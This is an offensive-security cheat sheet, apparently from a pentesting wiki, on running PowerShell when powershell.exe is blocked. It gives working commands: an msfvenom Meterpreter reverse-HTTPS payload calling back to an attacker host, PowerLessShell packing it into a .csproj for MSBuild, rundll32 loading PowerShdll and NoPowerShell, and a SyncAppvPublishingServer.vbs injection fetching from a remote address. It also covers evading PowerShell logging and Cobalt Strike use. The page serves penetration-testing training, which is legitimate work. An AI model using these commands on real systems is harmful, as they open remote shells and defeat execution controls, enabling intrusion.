# Powershell Without Powershell.exe

## Theory

Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it. If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.

## Practice

{% tabs %}
{% tab title="PowerLessShell" %}
[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git) is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.

```bash
#Generate a malisious powershell script
v4resk@kali$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1

#Generate a .csproj with PowerLessShell
v4resk@kali$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj

#Execute it on the target with MSBuild.exe
C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
{% endtab %}

{% tab title="PowerShdll" %}
We can load powerShdll with rundll32.exe to gain a shell

```bash
C:\Users\v4resk> rundll32.exe PowerShdll.dll,main
```
{% endtab %}

{% tab title="SyncAppvPublishingServer" %}
Windows 10 comes with SyncAppvPublishingServer.exe and SyncAppvPublishingServer.vbs that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```bash
C:\Users\v4resk> SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```
{% endtab %}

{% tab title="NoPowershell" %}
[NoPowerShell](https://github.com/bitsadmin/nopowershell) is a tool implemented in C# which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms.

This .NET Framework 2 compatible binary can be loaded in Cobalt Strike to execute commands in-memory. No `System.Management.Automation.dll` is used; only native .NET libraries. An alternative usecase for NoPowerShell is to launch it as a DLL via rundll32.exe:&#x20;

```powershell
rundll32 NoPowerShell.dll,main
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/livingofftheland" %}

{% embed url="https://www.ired.team/offensive-security/code-execution/powershell-without-powershell" %}
